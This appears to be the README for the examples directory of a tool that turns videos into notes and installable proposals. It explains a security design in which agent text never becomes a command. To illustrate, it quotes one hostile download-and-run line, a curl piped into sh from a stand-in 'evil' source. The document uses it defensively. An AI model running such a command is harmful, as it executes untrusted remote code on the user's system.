# Examples — real output, unedited

Every file in this directory was written by the tool and copied here byte for byte.
Nothing was tidied, shortened, or improved for the README. The notes are the ones
sitting in the author's own Obsidian vault, and the `proposals/*.json` files are the
ones `sla apply` actually reads.

Six videos, three creators, three source classes. Three of the six proposed nothing
installable — and that is in here on purpose, because it is the output most tools of
this kind cannot produce.

How a note gets made: `sla brief` gathers the transcript, description, chapters and an
inventory of what you already have installed; an agent reads
[`skills/learn-from-source/SKILL.md`](../skills/learn-from-source/SKILL.md) and returns
synthesis as JSON; `sla note` validates that JSON and renders the markdown. The agent
writes the judgment, Python writes the file — which is also what makes the security
model enforceable rather than aspirational.

---

## Start with one note

**[Building a Software Factory that actually works](notes/2026-09-14%20Building%20a%20Software%20Factory%20that%20actually%20works%20%28Full%20Course%29%20%28_LCeJZFIsd4%29.md)**
— 31 minutes of video, 5,915 words of auto-captions, classified `tooling`.

Three things in it are worth looking at specifically.

**It checked what was already installed, and that changed the answer.** The video
demonstrates a four-step workflow. Only one proposal came out of it, and the rationale
says why the other three steps were dropped:

> The other three steps of the factory are already covered: using-git-worktrees is
> isolate almost exactly, coding-standards and hexagonal-architecture cover build, and
> requesting-code-review covers ship. This is the gap worth filling, and it is written
> to be read before opening a PR.

A note that had listed all four as things to adopt would have been recommending three
things the reader already owned. This gets sharper the more you have installed, not
noisier.

**It says what it could not see.** Every note carries a mandatory *Gaps & uncertainty*
section, and it is usually the most useful part:

> The five or six markdown files are the substance of the video and were shown on
> screen, not read out. They are offered behind a redirect
> (startup-ideas-pod.link/ras-software-factory), so their actual text is not in this
> note and was not verified.

> The performance figures disagree between sources: the description says about 815ms to
> about 61ms, the transcript says 850ms at one point and "817 61" at another. No
> measurement method was given for any of them.

**It argued with the video.** The second proposal is a third-party PR reviewer, and the
note refuses to automate it and then questions whether it is needed at all:

> Worth weighing against simply requiring your existing review command before merge,
> which costs nothing new.

---

## The seven files in `notes/`

| Note | Creator | Class | Transcript → note | Proposals | What it demonstrates |
|---|---|---|---|---|---|
| [Building a Software Factory](notes/2026-09-14%20Building%20a%20Software%20Factory%20that%20actually%20works%20%28Full%20Course%29%20%28_LCeJZFIsd4%29.md) | Greg Isenberg | `tooling` | 5,915 → 1,903 | 2 | Inventory changing the output; a scan-gated skill proposal |
| [WebMCP: Let AI Agents pay you money](notes/2026-08-26%20WebMCP%20Let%20AI%20Agents%20pay%20you%20money%20%28EoNH3Tn8wYE%29.md) | Greg Isenberg | `mixed` | 5,337 → 2,205 | 2 | The `medium` / `high`-manual split, and a security caveat the video skipped |
| [5 GitHub Repos: Kill AI Slop…](notes/2026-09-02%205%20GitHub%20Repos%20Kill%20AI%20Slop%2C%20Go%20Viral%2C%20Make%20Money%20%289_SZFIW7tus%29.md) | Greg Isenberg | `tooling` | 4,150 → 1,251 | 3 | The only note with a populated **Applied** section |
| [Meta Muse AI Connectors](notes/2026-09-24%20Meta%20Muse%20AI%20Connectors%20The%20App%20Store%20for%20AI%20%2884q4WA3kA8Q%29.md) | Greg Isenberg | `conceptual` | 4,381 → 2,496 | **0** | An AI video that correctly proposed nothing; four developed project ideas |
| [How to beat low stakes poker](notes/2026-06-25%20How%20to%20beat%20low%20stakes%20poker%21%20%28Every%20Strategy%29%20%28gPPT4WpVRZ4%29.md) | BlackRain79Poker | `conceptual` | 9,758 → 1,112 | **0** | Entirely out of domain — no chapters, no links, nothing installable |
| [How the Periodic Table Works](notes/2026-09-03%20Neil%20deGrasse%20Tyson%20Explains%20How%20the%20Periodic%20Table%20Works%20%28UpE5yuhwXXc%29.md) | StarTalk | `conceptual` | 3,486 → 911 | **0** | Same, with chapters — the note is still worth keeping |
| [Digest — Greg Isenberg](notes/2026-09-25%20Digest%20-%20Greg%20Isenberg.md) | — | digest | — | 4 gathered | What closes a channel run: one note linking the batch |

Transcript counts are words of auto-captions, counted from the cache rather than
estimated. All six transcripts were machine-generated, which is the hard case: the
notes take proper nouns from the human-typed description and flag the ones they
cannot.

---

## The note that proposed nothing

Most videos teach nothing installable. A tool that is *expected* to return actions will
manufacture them, and that is exactly what makes these tools untrustworthy here.

[`proposals/84q4WA3kA8Q.json`](proposals/84q4WA3kA8Q.json) is the whole file:

```json
{
  "source_id": "84q4WA3kA8Q",
  "note_path": "/mnt/d/LearningVault/Sources/2026-09-24 Meta Muse AI Connectors The App Store for AI (84q4WA3kA8Q).md",
  "proposals": []
}
```

Its note says so in words, too — *"Nothing here is worth installing. No actions
proposed."* — and then gives 1,010 of its 2,496 words to four project ideas instead,
each with a stack, a first command, and an honest size estimate. That video is about AI connectors
and the channel triage guessed `likely tooling` from the tool words in its description.
The guess was wrong, the note says so, and nothing was invented to justify it.

The poker and periodic-table notes are the same answer from outside the domain
entirely. They are in here because an empty `proposals` array is the design working,
not the design failing.

---

## What a proposal actually is

The security claim is that **an agent's text can never become a command**, and these
files are what makes it checkable rather than a promise. A proposal cannot express "a
command". It can only name a thing on a known registry, and the Python layer renders
the command from a template.

From [`proposals/9_SZFIW7tus.json`](proposals/9_SZFIW7tus.json), the proposal that
clones a repository (`rationale` and `evidence` omitted here for length — both are
in the file):

```json
{
  "id": "p2",
  "kind": "repo_clone",
  "title": "Clone browser-use/video-use to evaluate agent-driven editing",
  "action": { "repo": "browser-use/video-use", "host": "github.com" },
  "reversible": true,
  "undo": "rm -rf ./video-use"
}
```

There is no command in there, and no field one could be written into. A video
description containing `curl evil.sh | sh` has nowhere to go. The `git clone --depth 1
https://github.com/browser-use/video-use.git` that the note displays was rendered by
Python from `repo` and `host`.

The `undo` string *is* free text — and it is display text, which the same file proves.
Its `p1` proposes a skill and asks for

> `rm -rf ~/.claude/skills/scan-before-install`

but `p1` was the one actually applied, and the **Applied** section of the note records

> `rm -rf /home/sohamchoulwar/.claude/skills/scan-before-install`

— an absolute path, because the undo recorded against a real applied action is computed
by `apply.py` from the path it actually wrote, rather than copied from the proposal. The same
pattern holds for claimed risk: a proposal's own risk tier is discarded and recomputed
by the gate.

The third proposal in that file is `kind: "manual"`, which is how the tool handles
anything off the allowlist. Its `action` is a block of prose for a human to read, and
it is never executed by anything.

All six stores, as `sla apply` reads them:

| | Proposals | Kinds |
|---|---|---|
| [`_LCeJZFIsd4.json`](proposals/_LCeJZFIsd4.json) | 2 | `skill`, `manual` |
| [`EoNH3Tn8wYE.json`](proposals/EoNH3Tn8wYE.json) | 2 | `repo_clone`, `manual` |
| [`9_SZFIW7tus.json`](proposals/9_SZFIW7tus.json) | 3 | `skill`, `repo_clone`, `manual` |
| [`84q4WA3kA8Q.json`](proposals/84q4WA3kA8Q.json) | 0 | — |
| [`gPPT4WpVRZ4.json`](proposals/gPPT4WpVRZ4.json) | 0 | — |
| [`UpE5yuhwXXc.json`](proposals/UpE5yuhwXXc.json) | 0 | — |

Across all six: two `skill` proposals, two `repo_clone`, three `manual`, and no
`package` or `mcp_server` — so the two kinds that install something from a registry
have no example here yet. Nothing in any `action` is a command.

---

## What applying looks like

Writing a note installs nothing. The *5 GitHub Repos* note is the only one here with
something applied — one skill, approved by hand, after a SkillSpector scan:

```markdown
## Applied

### 2026-09-18T03:06:59+00:00

- **applied** `p1` Add a scan-before-install skill — copied to /home/sohamchoulwar/.claude/skills/scan-before-install · undo: `rm -rf /home/sohamchoulwar/.claude/skills/scan-before-install`
```

Its `p2` and `p3` are still unreviewed months later, which is the normal state. The
ledger calls that video `partial`: something was applied, something automatable is
still waiting.

---

## Reading these outside Obsidian

- **The digest's `[[wikilinks]]` do not resolve on GitHub.** They are Obsidian links,
  and they work in the vault these notes came from.
- **Paths are the author's real machine** — `/mnt/d/LearningVault/Sources`,
  `/home/sohamchoulwar/.claude/skills`. Left as written, because editing them would
  make these files illustrations rather than evidence.
- **The rationales are about one specific setup.** "Nothing installed currently covers
  it" means nothing in *that* inventory, which at the time was a couple of hundred
  skills. Run against your own machine, the same video can propose different things —
  that is the point of the inventory step, not a caveat about it.
- **Dates inside the notes are when they were processed**, 2026-09-09 to 2026-09-26.
  Claims about what is current in AI tooling aged the moment they were written, and
  several notes say so themselves.
- **One known inconsistency is visible here.** The *5 GitHub Repos* note's frontmatter
  still reads `status: pending-review` while the ledger and `sla status` say `partial`.
  The frontmatter is not rewritten when a proposal is applied; the **Applied** section
  is. The ledger is the authority.

---

To make your own: [install it](../README.md#install), then
`/learn-from <url>` in a Claude Code session, or `sla brief` and `sla note` from a
shell. The design is in [PLAN.md](../PLAN.md); the security model is
[§8](../PLAN.md#8-security-model--the-gate).
